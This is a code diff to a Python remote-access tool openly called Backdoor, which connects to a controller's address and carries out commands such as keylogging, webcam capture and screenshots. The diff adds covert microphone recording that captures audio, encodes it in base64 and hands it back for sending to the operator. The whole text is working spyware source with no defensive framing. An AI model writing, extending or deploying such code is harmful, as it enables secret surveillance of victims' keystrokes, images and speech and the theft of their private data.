@@ -12,6 +12,9 @@ import time
 import cv2
 from PIL import ImageGrab
 import io
+from pvrecorder import PvRecorder
+import wave
+import struct
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -20,6 +23,11 @@ class Backdoor:
             self.conn.connect((ip, port))
         except Exception as e:
             print(f"[+] Socket connection failed! Error: {str(e)}")
+            
+        self.recorder = None
+        self.audio_data = []
+        self.recording_thread = None
+        self.is_recording = False
 
     def receive(self):
         json_result = ""
@@ -96,7 +104,8 @@ class Backdoor:
                 logging.info(str(key))
 
         with Listener(on_press=on_press) as listener:
-            listener.join()
+            listener.join() 
+            
 
     def keyscan_stop(self):
         self.keylogging = False
@@ -145,6 +154,65 @@ class Backdoor:
         cam.release()
         return images
     
+    def mic_start(self):
+        if self.recorder is not None:
+            return b"[-] Mic is already recording!"
+
+        try:
+            self.recorder = PvRecorder(device_index=-1, frame_length=512)
+            self.recorder.start()
+            self.audio_data = []
+            self.is_recording = True
+
+            def record():
+                while self.is_recording:
+                    try:
+                        frame = self.recorder.read()
+                        self.audio_data.extend(frame)
+                    except Exception as e:
+                        print(f"[-] Recording error: {str(e)}")
+                        self.is_recording = False
+                        break
+
+            self.recording_thread = threading.Thread(target=record, daemon=True)
+            self.recording_thread.start()
+
+            return b"[+] Mic recording started!"
+
+        except Exception as e:
+            self.recorder = None
+            print(f"[-] Error starting mic: {str(e)}")
+            return f"[-] Error starting mic: {str(e)}".encode()
+
+    def mic_stop(self):
+        if self.recorder is None:
+            return b"[-] No mic recording to stop!"
+
+        try:
+            self.is_recording = False
+            self.recorder.stop()
+            self.recorder.delete()
+            self.recorder = None
+            self.recording_thread.join()
+
+            file_path = "temp_audio.wav"
+            with wave.open(file_path, 'w') as wf:
+                wf.setnchannels(1)
+                wf.setsampwidth(2)  
+                wf.setframerate(16000)
+                wf.writeframes(struct.pack("h" * len(self.audio_data), *self.audio_data))
+
+            with open(file_path, "rb") as audio_file:
+                audio_data = base64.b64encode(audio_file.read()).decode()
+
+            os.remove(file_path) 
+            self.audio_data = []
+            return audio_data
+
+        except Exception as e:
+            return f"[-] Error stopping mic: {str(e)}".encode()
+            
+    
     def run(self):
         while True:
             try:
@@ -180,6 +248,11 @@ class Backdoor:
                     result = self.screenshot()
                     self.send(result)
                     continue
+                elif command[0] == "mic_start":
+                    result = self.mic_start()
+                    
+                elif command[0] == "mic_stop":
+                    result = self.mic_stop()
                 elif command[0] == "exit":
                     self.conn.close()
                     exit(0)
